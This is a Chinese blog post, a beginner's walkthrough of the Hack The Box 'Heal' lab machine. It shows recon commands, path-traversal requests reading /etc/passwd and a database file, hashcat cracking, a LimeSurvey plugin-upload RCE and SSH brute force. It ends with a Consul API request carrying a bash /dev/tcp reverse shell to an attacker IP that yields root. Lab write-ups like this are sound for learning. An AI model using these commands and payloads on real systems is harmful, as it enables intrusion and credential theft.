
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/hu1j/p/18860672" title="发布于 2025-05-06 10:44">
    <span role="heading" aria-level="2">[HTB] 靶机学习（一）Heal</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        学习hackthebox的第一天，本人为初学者，将以初学者的角度对靶机渗透进行学习，中途可能会插入一些跟实操关系不大的相关新概念的学习和解释，尽量做到详细，不跳步，所以也会有理解不正确的地方，欢迎大佬们提出指正
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="htb-靶机学习一heal">[HTB] 靶机学习（一）Heal</h1>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011023116.png" alt="" loading="lazy"></p>
<h2 id="概要">概要</h2>
<p>学习hackthebox的第一天，本人为初学者，将以初学者的角度对靶机渗透进行学习，中途可能会插入一些跟实操关系不大的相关新概念的学习和解释，尽量做到详细，不跳步，所以也会有理解不正确的地方，欢迎大佬们提出指正</p>
<h2 id="信息收集">信息收集</h2>
<h3 id="端口扫描">端口扫描</h3>
<p>由于可能是网络问题，扫描全端口很慢，所以用-F扫描top100端口，-sC表示使用nmap默认脚本扫描，-sV表示探测服务版本信息</p>
<pre><code>nmap -sC -sV -F 10.10.11.46
</code></pre>
<pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2025-05-01 11:05 CST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.11.46
Host is up (3.5s latency).
Not shown: 95 closed tcp ports (reset)
PORT    STATE    SERVICE    VERSION
22/tcp  open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
25/tcp  open     tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open     http       nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
110/tcp open     tcpwrapped
514/tcp filtered shell
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>可以看到，开放了22，25，80，110，514端口</p>
<p>先看看80端口的，注意到标题Did not follow redirect to <a href="http://heal.htb/%EF%BC%8C%E6%97%A0%E6%B3%95%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E6%94%B9%E4%B8%80%E4%B8%8Bhosts%E6%96%87%E4%BB%B6%E5%B9%B6%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99" target="_blank" rel="noopener nofollow">http://heal.htb/，无法重定向，所以先改一下hosts文件并访问网站</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011156687.png" alt="" loading="lazy"></p>
<h3 id="子域名爆破">子域名爆破</h3>
<p>模糊测试HOST头部，匹配200状态码</p>
<pre><code>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -u http://heal.htb -H "Host: FUZZ.heal.htb" 
</code></pre>
<p>-w：设置字典</p>
<p>-mc：匹配http状态码</p>
<p>-H：匹配http头部</p>
<p>发现api.heal.htb子域名</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011156958.png" alt="" loading="lazy"></p>
<p>添加子域名并访问网站</p>
<pre><code>echo '10.10.11.46 api.heal.htb' &gt;&gt; /etc/hosts 
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011206189.png" alt="" loading="lazy"></p>
<h3 id="目录爆破">目录爆破</h3>
<pre><code>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -u http://heal.htb -t 50
</code></pre>
<p>发现survey路由，访问http://heal.htb/survey</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011937366.png" alt="" loading="lazy"></p>
<p>点击参与调查，跳转到新的子域名http://take-survey.heal.htb，显示无法使用此页面，需要添加到hosts文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011940260.png" alt="" loading="lazy"></p>
<p>得到用户名ralph</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505011942236.png" alt="" loading="lazy"></p>
<h3 id="子域名目录爆破">子域名目录爆破</h3>
<pre><code>dirsearch -u "http://take-survey.heal.htb/index.php/" -i 200,302 
</code></pre>
<p>因为503太多了，选择-i 只匹配200，302</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012040957.png" alt="" loading="lazy"></p>
<p>有多个302跳转，访问http://take-survey.heal.htb/index.php/admin/authentication/sa/login</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012042352.png" alt="" loading="lazy"></p>
<p>差不多收集完了，从头开始看看</p>
<h2 id="漏洞利用">漏洞利用</h2>
<h3 id="目录遍历">目录遍历</h3>
<p>回到http://heal.htb，注册一个看看，随便填</p>
<p>注册完划到最下面</p>
<p>点击导出pdf，抓包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012047472.png" alt="" loading="lazy"></p>
<p>放行到第三个包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012051102.png" alt="" loading="lazy"></p>
<p>发现了filename参数，试试能不能利用目录遍历来读取敏感文件</p>
<pre><code>GET /download?filename=../../../../../etc/passwd 
</code></pre>
<p>找到两个/bin/bash登录用户，ralph和ron</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012054873.png" alt="" loading="lazy"></p>
<p>再看看第一个获取到的子域名http://api.heal.htb</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012135246.png" alt="" loading="lazy"></p>
<p>看看ruby by rails有没有什么敏感文件，然后利用目录遍历读取出来，经过搜索，发现有数据库相关的配置文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012135813.png" alt="" loading="lazy"></p>
<p>依旧是尝试一个个添加../</p>
<pre><code>GET /download?filename=../../config/database.yml 
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012141480.png" alt="" loading="lazy"></p>
<p>发现了数据库文件，读取看看</p>
<pre><code>GET /download?filename=../../storage/development.sqlite3 HTTP/1.1
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012215114.png" alt="" loading="lazy"></p>
<h3 id="哈希爆破">哈希爆破</h3>
<p>$2a$开头，为bcrypt类型的hash，所以指定-m 3200</p>
<pre><code>hashcat -m 3200 '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG' /usr/share/wordlists/rockyou.txt
</code></pre>
<p>得到明文147258369</p>
<pre><code>$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
                                                          
Session..........: hashcat
Status...........: Cracked
</code></pre>
<p>尝试ssh登录，密码错误，看来不是用来登录ssh的密码</p>
<pre><code>└─# ssh ralph@10.10.11.46       
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012225216.png" alt="" loading="lazy"></p>
<p>回想到刚才有个登录界面，用ralph/147258369登录看看，语言选择中文</p>
<p><a href="http://take-survey.heal.htb/index.php/admin/authentication/sa/login" target="_blank" rel="noopener nofollow">http://take-survey.heal.htb/index.php/admin/authentication/sa/login</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012227715.png" alt="" loading="lazy"></p>
<h3 id="limesurvey-664-rce">limesurvey 6.6.4 rce</h3>
<p>(<a href="https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE" target="_blank" rel="noopener nofollow">https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE</a>)</p>
<p>下载上述网址的zip</p>
<p>修改revshell.php的ip和端口，我的是kali的ip</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012342317.png" alt="" loading="lazy"></p>
<p>将修改后的revshell.php和config.xml打包成zip</p>
<p>选择配置-》插件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012244557.png" alt="" loading="lazy"></p>
<p>选择上传并安装，上传刚刚的zip文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012245417.png" alt="" loading="lazy"></p>
<p>上传zip</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012246816.png" alt="" loading="lazy"></p>
<p>选择安装</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012246083.png" alt="" loading="lazy"></p>
<p>可以在第二页看到我们刚刚安装的插件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012243002.png" alt="" loading="lazy"></p>
<p>激活插件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012307513.png" alt="" loading="lazy"></p>
<p>得到插件的id是21</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012346635.png" alt="" loading="lazy"></p>
<p>修改插件id</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012346785.png" alt="" loading="lazy"></p>
<pre><code>python exploit.py http://take-survey.heal.htb ralph 147258369 80
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012347684.png" alt="" loading="lazy"></p>
<p>在kali上反弹shell成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505012348732.png" alt="" loading="lazy"></p>
<h3 id="升级为交互式shell">升级为交互式shell</h3>
<pre><code>python3 -c "import pty;pty.spawn('/bin/bash')"
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021027954.png" alt="" loading="lazy"></p>
<p>www-data权限还是比较低的，看看有没有什么敏感文件，比如数据库文件，网站配置文件等</p>
<pre><code>find /var/www/ -type f -name '*config*' 2&gt;/dev/null -print0 | xargs -0 grep -i 'pass'
</code></pre>
<pre><code>find /var/www/ -type f -name '*config*'：找到/var/www目录的文件名中带有config的普通文件
2&gt;/dev/null：错误重定向，隐藏错误输出
-print0：每个匹配的文件用 null 字符（\0） 结尾输出，用于防止文件名中含有空格、换行、特殊字符造成问题。
xargs：接收前面 find 命令输出的文件路径，并一批一批地传递给下一个命令（即 grep）执行。

-0：告诉 xargs 以 null 字符（而不是空格或换行）分隔输入，与 -print0 配合，防止路径中有空格出错。
grep -i：不区分大小写，逐行查找关键字
</code></pre>
<p>找到一个密码AdmiDi0_pA$$w0rd</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021042822.png" alt="" loading="lazy"></p>
<p>将收集到的密码写到pass，用户名写到user</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021046712.png" alt="" loading="lazy"></p>
<h3 id="ssh爆破">ssh爆破</h3>
<p>使用msf爆破ssh</p>
<pre><code>msfconsole
set RHOSTS 10.10.11.46 
set PASS_FILE /root/pass
set USER_FILE /root/user
run
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021103286.png" alt="" loading="lazy"></p>
<p>得到用户名和密码ron:AdmiDi0_pA$$w0rd，ssh登录得到第一个flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021119900.png" alt="" loading="lazy"></p>
<h2 id="权限提升">权限提升</h2>
<h3 id="ssh端口转发">ssh端口转发</h3>
<p>查看端口开放</p>
<pre><code>ss -tuln
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021125056.png" alt="" loading="lazy"></p>
<p>由于虚拟机网络问题，抽风了，连接很慢，且都是在127.0.0.1上的内网服务，正常是无法访问的，需要端口转发，改用本机的mobaxterm进行端口转发，经过尝试，3000是最开始的heal.htb，其他端口没什么有用的，基本没有实际服务，只有8500端口看起来比较有用，</p>
<p>打开mobaxterm内置的终端</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021154721.png" alt="" loading="lazy"></p>
<pre><code>ssh -L 8500:127.0.0.1:8500 ron@heal.htb
</code></pre>
<pre><code>冒号前面是本地端口，冒号后面是远程服务器的端口，也就是10.10.11.46上的内网服务

ssh -L ：本地端口转发，用ssh连接建立ssh隧道，当访问本地的8500端口时，通过ssh隧道转发到heal.htb上的8500端口，相当于本地通过ssh隧道访问heal.htb的内网服务
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021153799.png" alt="" loading="lazy"></p>
<p>本机访问http://127.0.01:8500，找到了版本号Consul v1.19.2，查一下有没有漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021203443.png" alt="" loading="lazy"></p>
<h3 id="hashicorp-consul-v10-rce">Hashicorp Consul v1.0 RCE</h3>
<p>发现有rce漏洞</p>
<p>参考https://blog.csdn.net/lhh134/article/details/135673444</p>
<p>访问http://127.0.0.1:8500/v1/agent/self</p>
<p>查找EnableRemoteScriptChecks，为true，大概是有漏洞的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021501809.png" alt="" loading="lazy"></p>
<p>poc似乎有点问题，Request decode failed: json: unknown field "script"</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021504622.png" alt="" loading="lazy"></p>
<p>后来又找到另一个</p>
<p><a href="https://www.exploit-db.com/exploits/51117" target="_blank" rel="noopener nofollow">https://www.exploit-db.com/exploits/51117</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021506361.png" alt="" loading="lazy"></p>
<p>发现这里没有写script键值对，删除试试，回显200，接着访问http://127.0.0.1:8500/ui/server1/nodes/consul-01/health-checks，发现是root用户</p>
<pre><code>PUT /v1/agent/service/register HTTP/1.1
Host: 127.0.0.1:8500
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)
X-Consul-Token: 
Content-type: application/json
Connection: close
Content-Length: 246

{
    "ID": "bpPeMfZuAN",
    "Name": "bpPeMfZuAN",
    "Address":"127.0.0.1",
    "Port":80,
    "check":{
 
                "Args": ["sh", "-c","whoami"],
                "interval":"10s",
                "Timeout":"86400s"
    }
}

</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021448288.png" alt="" loading="lazy"></p>
<h3 id="反弹shellroot">反弹shell（root）</h3>
<pre><code>PUT /v1/agent/service/register HTTP/1.1
Host: 127.0.0.1:8500
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)
X-Consul-Token: 
Content-type: application/json
Connection: close
Content-Length: 295

{
    "ID": "bpPeMfZuAN",
    "Name": "bpPeMfZuAN",
    "Address":"127.0.0.1",
    "Port":80,
    "check":{
       
            "Args": ["/bin/bash", "-c","/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.29/1234 0&gt;&amp;1"],
                "interval":"10s",
                "Timeout":"86400s"
    }
}
</code></pre>
<p>先在kali监听1234端口，发送请求包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021459100.png" alt="" loading="lazy"></p>
<p>在root目录的root.txt找到第二个flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202505021459449.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.01825383245023148" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-05-06 10:45">2025-05-06 10:44</span>&nbsp;
<a href="https://www.cnblogs.com/hu1j">Hu1j</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18860672);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18860672', targetLink: 'https://www.cnblogs.com/hu1j/p/18860672', title: '[HTB] 靶机学习（一）Heal' })">举报</a>
</div>
        